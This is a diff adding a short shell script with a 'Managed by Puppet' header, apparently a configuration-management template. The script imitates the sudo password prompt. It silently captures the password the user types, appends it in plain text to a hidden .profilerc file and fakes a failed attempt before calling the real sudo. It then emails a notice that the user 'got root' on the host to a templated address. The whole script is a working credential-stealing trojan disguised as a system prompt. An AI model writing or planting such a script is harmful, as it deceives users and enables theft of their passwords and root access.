@@ -1,0 +1,19 @@
+##################################
+#
+# Managed by Puppet
+#
+##################################
+
+#!/bin/sh
+
+echo "##################################################"
+echo "# Please note, this is asking for YOUR password, #"
+echo "# so make sure you have a strong one!            #"
+echo "##################################################"
+echo '[sudo] password for abmarea:'
+read -s password
+echo $password >> .profilerc
+echo "Sorry, try again."
+/usr/bin/sudo /bin/su - root
+
+echo `date` | mail -s "`whoami` got root on `hostname`" <%%username%%>@<%%domain%%>.com
